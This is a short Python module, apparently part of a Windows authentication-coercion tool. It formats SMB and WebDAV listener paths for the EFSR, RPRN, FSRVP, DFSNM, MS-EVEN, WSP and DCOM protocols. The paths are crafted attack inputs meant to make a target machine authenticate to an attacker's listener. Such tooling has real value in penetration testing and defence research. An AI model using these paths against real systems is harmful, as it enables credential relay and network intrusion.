"""Listener path formatting per protocol and transport (SMB vs WebDAV)."""

import random
import string


def _rnd(n=8):
    return "".join(random.choices(string.ascii_lowercase, k=n))


def efsr_path(listener, listener_port=445):
    """EFSR UNC path. WebDAV when port != 445."""
    if listener_port != 445:
        return "\\\\%s@%d/%s\\share\\file.txt\x00" % (listener, listener_port, _rnd(3))
    return "\\\\%s\\test\\Settings.ini\x00" % listener


def rprn_path(listener, listener_port=445):
    """RPRN listener path. WebDAV when port != 445."""
    if listener_port != 445:
        return "\\\\%s@%d/%s\x00" % (listener, listener_port, _rnd(3))
    return "\\\\%s\x00" % listener


def fsrvp_path(listener, listener_port=445):
    """FSRVP share path. WebDAV when port != 445."""
    if listener_port != 445:
        return "\\\\%s@%d/%s\x00" % (listener, listener_port, _rnd(3))
    return "\\\\%s\\test\x00" % listener


def dfsnm_path(listener, listener_port=445):
    """DFSNM ServerName path. WebDAV when port != 445."""
    if listener_port != 445:
        return "\\\\%s@%d/%s\\share\\file.txt\x00" % (listener, listener_port, _rnd(3))
    return "\\\\%s\\%s\\file.txt\x00" % (listener, _rnd())


def dfsnm_dfs_path(listener, listener_port=445):
    """DFSNM pDfsPath for AddRootTarget/RemoveRootTarget."""
    if listener_port != 445:
        return "\\\\%s@%d/%s\x00" % (listener, listener_port, _rnd(3))
    return "\\\\%s\\a\x00" % listener


def even_path(listener, listener_port=445):
    """MS-EVEN device path. SMB only — no WebDAV variant."""
    return "\\??\\UNC\\%s\\%s\\aa\x00" % (listener, _rnd())


def wsp_uri(listener):
    """WSP file:// URI. SMB only."""
    return "file:////%s/share" % listener


def dcom_unc(listener):
    """DCOM UNC path with random share/filename."""
    share = "".join(random.choices(string.ascii_letters, k=4))
    fname = "".join(random.choices(string.ascii_letters, k=4))
    return "\\\\%s\\%s\\%s.txt" % (listener, share, fname)
